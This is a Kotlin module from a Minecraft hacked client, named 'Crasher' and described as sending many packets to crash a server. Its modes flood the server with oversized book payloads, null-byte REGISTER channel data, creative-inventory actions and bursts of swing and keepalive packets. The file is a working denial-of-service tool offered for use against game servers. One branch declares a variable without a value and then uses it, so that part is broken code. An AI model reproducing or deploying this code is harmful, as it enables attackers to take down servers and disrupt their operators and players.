package me.han.muffin.client.module.modules.exploits

import io.netty.buffer.Unpooled
import me.han.muffin.client.core.Globals
import me.han.muffin.client.event.EventStageable
import me.han.muffin.client.event.events.client.MotionUpdateEvent
import me.han.muffin.client.event.events.client.TickEvent
import me.han.muffin.client.event.events.network.PacketEvent
import me.han.muffin.client.event.events.network.ServerEvent
import me.han.muffin.client.manager.managers.ChatManager
import me.han.muffin.client.module.Module
import me.han.muffin.client.utils.InfoUtils
import me.han.muffin.client.utils.math.RandomUtils
import me.han.muffin.client.value.EnumValue
import me.han.muffin.client.value.NumberValue
import me.han.muffin.client.value.Value
import net.minecraft.init.Items
import net.minecraft.item.ItemStack
import net.minecraft.nbt.NBTTagCompound
import net.minecraft.nbt.NBTTagList
import net.minecraft.nbt.NBTTagString
import net.minecraft.network.PacketBuffer
import net.minecraft.network.play.client.*
import net.minecraft.util.EnumFacing
import net.minecraft.util.EnumHand
import net.minecraft.util.math.BlockPos
import team.stiff.pomelo.impl.annotated.handler.annotation.Listener
import java.lang.Thread.sleep
import kotlin.concurrent.thread

internal object CrasherModule: Module("Crasher", Category.EXPLOITS, "Send a lot of packets to crash server.") {
    private val packets = NumberValue(200, 0, 400, 2, "Packets")
    private val mode = EnumValue(Mode.Book, "Mode")
    private val lowFpsDisable = Value(true, "DisableLowFps")

    private const val message = "\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd"

    private enum class Mode {
        Swing, Nearby, Book, Sign, Edit, Register, InvalidPackets, RegisterPackets
    }

    var buffer: PacketBuffer? = null

    init {
        addSettings(mode, packets, lowFpsDisable)
    }

    @Listener
    private fun onDisconnect(event: ServerEvent.Disconnect) {
        disable()
    }

    override fun onDisable() {
    }

    @Listener
    private fun onPacketSent(event: PacketEvent.Send) {
        if (event.packet is CPacketCustomPayload) {
       ///     ChatManager.sendMessage("SENT... ${event.packet.channelName}, DATA: ${event.packet.bufferData}")
        }
    }

    override fun onEnable() {

        if (mode.value == Mode.Sign || mode.value == Mode.Edit) {
            val tag = NBTTagCompound()
            val list = NBTTagList()
            val size = message
            for (i in 0 until 50) {
                list.appendTag(NBTTagString(size))
            }
            tag.setString("author", "AuthSmasher" + RandomUtils.random.nextInt(20))
            tag.setString("title", "MojangIstToll" + RandomUtils.random.nextInt(20))
            tag.setInteger("resolved", 1)
            tag.setTag("pages", list)

            val book = ItemStack(Items.WRITABLE_BOOK)
            book.tagCompound = tag

            val pb = PacketBuffer(Unpooled.buffer())
            pb.writeItemStack(book)
            for (i in 0..packets.value) {
                Globals.mc.connection?.sendPacket(
                    CPacketCustomPayload(if (mode.value == Mode.Sign) "MC|BSign" else "MC|BEdit", pb)
                )
            }
        }

        if (mode.value == Mode.Register || mode.value == Mode.InvalidPackets) {
            val size

            val bookStack = ItemStack(Items.WRITABLE_BOOK)
            val author = "Netty$size"

            val bookCompound = NBTTagCompound()
            val pageList = NBTTagList()
            for (i3 in 0..339) {
                val tString = NBTTagString(size)
                pageList.appendTag(tString)
            }
            bookCompound.setString("author", author)
            bookCompound.setString("title", size)
            bookCompound.setTag("pages", pageList)

            bookStack.tagCompound?.setTag("pages", pageList) ?: bookStack.setTagInfo("pages", pageList)

            //   println(bookStack.tagCompound.toString().toByteArray().size)

            if (mode.value == Mode.Register) {
                for (i in 0..packets.value) {
                    Globals.mc.connection?.sendPacket(CPacketPlayerTryUseItemOnBlock(BlockPos(Globals.mc.player.posX, Globals.mc.player.posY - 2.0, Globals.mc.player.posZ), EnumFacing.UP, EnumHand.MAIN_HAND, 0.0f, 0.0f, 0.0f))
                }
            } else if (mode.value == Mode.InvalidPackets) {
                thread {
                    for (i in 0..packets.value) {
                        while (Globals.mc?.connection?.networkManager?.isChannelOpen == true) {
                            Globals.mc.connection?.sendPacket(CPacketCreativeInventoryAction(100, bookStack))
                            try {
                                sleep(10L)
                            } catch (e: InterruptedException) {
                                e.printStackTrace()
                            }
                        }
                    }
                }
            }
        }

    }

    var register = true

    @Listener
    private fun onTicking(event: TickEvent) {
        when (mode.value) {
            // credits to raion client
            Mode.RegisterPackets -> {
            //    if (register) {
                if (buffer == null) {
                    buffer = PacketBuffer(Unpooled.buffer())
                    for (i in 0 until 32767 / 4) buffer!!.writeByte('\u0000'.toInt())
                }

           //     for (packets in 0 until packets.value) {
                    //Globals.mc.connection?.sendPacket(CPacketCustomPayload("REGISTER", buffer!!))
                    Globals.mc.connection?.sendPacket(CPacketCustomPayload("REGISTER", buffer!!))
                    register = false
            //    }
            //    } else {
             //       val buff = StringUtils.repeat("\u0000", 120).toByteArray(Charsets.UTF_8)
             //       val buffer = PacketBuffer(Unpooled.buffer())
                    //buff.forEach { buffer.writeByte(it.toInt()) }
              //      buffer.writeBytes(buff)
              //      Globals.mc.connection?.sendPacket(CPacketCustomPayload("UNREGISTER", buffer))
             //       register = true
            //    }
            }
        }
    }

    @Listener
    private fun onMotionUpdate(event: MotionUpdateEvent) {
        if (event.stage != EventStageable.EventStage.PRE) return

        if (fullNullCheck()) return

        if (lowFpsDisable.value && InfoUtils.fps() < 10) {
            ChatManager.sendMessage("Disabling due to low fps.")
            disable()
            return
        }

        when (mode.value) {
            Mode.Nearby -> {
                if (mode.value == Mode.Nearby) {
                    if (Globals.mc.world.getEntitiesWithinAABBExcludingEntity(Globals.mc.player, Globals.mc.player.entityBoundingBox).isNotEmpty()) {
                        for (i in 0..packets.value) {
                            //   Globals.mc.connection?.sendPacket(new CPacketPlayer(new Random().nextBoolean()));
                            Globals.mc.connection?.sendPacket(CPacketPlayer(Math.random() >= 0.5))
                            Globals.mc.connection?.sendPacket(CPacketKeepAlive((Math.random() * 8).toLong()))
                        }
                    }
                }
            }
            Mode.Swing -> {
                var i = 0
                while (i < packets.value) {
                    Globals.mc.connection?.sendPacket(CPacketAnimation(EnumHand.MAIN_HAND))
                    i++
                }
            }
            Mode.Book -> {
                val bookStack = ItemStack(Items.WRITABLE_BOOK)
                val bookCompound = NBTTagCompound()

                bookCompound.setString("author", RandomUtils.randomNumber(20))
                bookCompound.setString("title", RandomUtils.randomNumber(20))

                val pageList = NBTTagList()
                val pageText = RandomUtils.randomNumber(600)

                for (i in 0..49) {
                    pageList.appendTag(NBTTagString(pageText))
                }

                bookCompound.setTag("pages", pageList)
                bookStack.tagCompound = bookCompound

                for (i in 0..99) {
                    val packetBuffer = PacketBuffer(Unpooled.buffer())
                    packetBuffer.writeItemStack(bookStack)
                    Globals.mc.connection?.sendPacket(CPacketCustomPayload(if (RandomUtils.random.nextBoolean()) "MC|BSign" else "MC|BEdit", packetBuffer))
                }
            }
        }
    }

}